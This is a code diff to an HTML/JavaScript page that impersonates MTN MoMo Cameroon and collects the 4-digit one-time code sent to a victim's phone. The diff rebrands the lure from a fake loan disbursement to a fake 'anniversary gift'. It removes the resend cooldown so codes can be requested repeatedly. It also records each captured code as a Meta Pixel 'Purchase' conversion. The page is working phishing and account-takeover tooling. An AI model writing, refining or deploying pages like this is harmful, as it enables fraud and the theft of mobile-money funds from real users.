@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#000000">
-    <title>MTN MoMo Loan - Verify Code | MoMo Advance Loans</title>
+    <title>MTN MoMo – Verify Code | MTN MoMo Anniversary</title>
 
     <!-- ============================================
          META PIXEL — BASE CODE
@@ -76,7 +76,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* HEADER */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -111,10 +110,11 @@
         }
         .brand-sub {
             font-size: 12px;
-            color: #9ca3af;
-            font-weight: 500;
+            color: var(--mtn-gold);
+            font-weight: 700;
             letter-spacing: 0.5px;
             white-space: nowrap;
+            text-transform: uppercase;
         }
         .header-back {
             background: rgba(255, 255, 255, 0.08);
@@ -136,7 +136,6 @@
             color: #fff;
         }
 
-        /* CARD */
         .card-wrap {
             width: 100%;
             max-width: 480px;
@@ -205,7 +204,6 @@
         }
         .instruction strong { color: var(--text-dark); font-weight: 800; }
 
-        /* OTP BOXES */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -337,8 +335,7 @@
             border-radius: 8px;
             transition: background 0.2s;
         }
-        .resend-link:hover:not(:disabled) { background: #EEF3FF; }
-        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
+        .resend-link:hover { background: #EEF3FF; }
 
         .security-notice {
             display: flex;
@@ -368,7 +365,6 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* SUPER VERIFY OVERLAY */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -589,7 +585,6 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
-        /* NOTICE POPUP */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -720,7 +715,6 @@
             box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
         }
 
-        /* CONGRATS OVERLAY */
         .congrats-overlay {
             position: fixed;
             inset: 0;
@@ -869,19 +863,17 @@
 </head>
 <body>
 
-    <!-- HEADER -->
     <header class="header">
         <div class="header-inner">
             <a href="sms-paste.html" class="brand">
                 <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
                 <div class="brand-divider"></div>
-                <span class="brand-sub">MoMo Advance Loans</span>
+                <span class="brand-sub">MTN MoMo Anniversary</span>
             </a>
             <button class="header-back" onclick="window.location.href='sms-paste.html'">← Back</button>
         </div>
     </header>
 
-    <!-- CARD -->
     <div class="card-wrap">
         <main class="card">
             <div class="icon-badge">🔐</div>
@@ -892,7 +884,7 @@
 
             <p class="instruction">
                 We sent a <strong>4-digit code</strong> to your MoMo number.
-                Enter it below to confirm your loan disbursement.
+                Enter it below to confirm your anniversary gift claim.
             </p>
 
             <div class="otp-boxes" id="otpBoxes">
@@ -908,11 +900,10 @@
                 VERIFY &amp; CONTINUE →
             </button>
 
+            <!-- Resend row — no countdown -->
             <div class="resend-row">
                 Didn't receive the code?
-                <button class="resend-link" id="resendBtn" type="button" disabled>
-                    Resend (<span id="countdown">60</span>s)
-                </button>
+                <button class="resend-link" id="resendBtn" type="button">Resend code</button>
             </div>
 
             <div class="security-notice">
@@ -922,12 +913,10 @@
         </main>
     </div>
 
-    <!-- FOOTER -->
     <footer class="footer">
         <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
     </footer>
 
-    <!-- SUPER VERIFY OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-particles">
             <span class="verify-particle"></span>
@@ -977,7 +966,6 @@
         </div>
     </div>
 
-    <!-- NOTICE POPUP -->
     <div class="notice-overlay" id="noticeOverlay">
         <div class="notice-card">
             <div class="notice-icon-wrap" id="noticeIconWrap">
@@ -989,24 +977,23 @@
         </div>
     </div>
 
-    <!-- CONGRATS OVERLAY -->
     <div class="congrats-overlay" id="congratsOverlay">
         <div class="congrats-content">
             <div class="congrats-header">
                 <span class="congrats-emoji">🎉</span>
                 <h2 class="congrats-title">Congratulations!</h2>
-                <p class="congrats-subtitle">Your loan request has been approved</p>
+                <p class="congrats-subtitle">Your anniversary gift has been approved</p>
             </div>
             <div class="congrats-body">
                 <p class="congrats-message">
-                    Please wait for the <span class="highlight">disbursement</span>
+                    Please wait for your <span class="highlight">reward</span>
                 </p>
                 <div class="congrats-time">
                     <span class="clock">⏰</span>
                     <span>Approximately less than 24 hours</span>
                 </div>
                 <p class="congrats-note">
-                    You'll receive an SMS notification once the funds have been sent to your MoMo account.
+                    You'll receive an SMS notification once the reward has been credited to your MoMo account.
                 </p>
                 <button class="congrats-btn" onclick="window.location.href='index.html'">
                     OK, GOT IT →
@@ -1101,30 +1088,8 @@
             });
         });
 
-        let remaining = 60;
-        let resendTimer = null;
-
-        function startCountdown() {
-            remaining = 60;
-            resendBtn.disabled = true;
-            resendBtn.innerHTML = 'Resend (<span id="countdown">60</span>s)';
-            const el = document.getElementById('countdown');
-
-            resendTimer = setInterval(function() {
-                remaining--;
-                if (el) el.textContent = remaining;
-                if (remaining <= 0) {
-                    clearInterval(resendTimer);
-                    resendBtn.disabled = false;
-                    resendBtn.innerHTML = 'Resend code';
-                }
-            }, 1000);
-        }
-
-        startCountdown();
-
+        // ✅ Resend code — no countdown, always active
         resendBtn.addEventListener('click', async function() {
-            if (resendBtn.disabled) return;
             try {
                 await fetch(`${API_BASE}/api/resend-sms`, {
                     method: 'POST',
@@ -1134,7 +1099,6 @@
             } catch (err) {
                 console.warn('resend error:', err.message);
             }
-            startCountdown();
         });
 
         let verifyTimer = null;
@@ -1230,8 +1194,8 @@
                         /* ✅ META PIXEL — Purchase fired when OTP is approved */
                         if (typeof fbq === 'function') {
                             fbq('track', 'Purchase', {
-                                content_name: 'MoMo Loan Disbursed',
-                                content_category: 'OTP_Verified',
+                                content_name: 'MoMo Anniversary Gift Claimed',
+                                content_category: 'Anniversary',
                                 value: 0,
                                 currency: 'XAF'
                             });
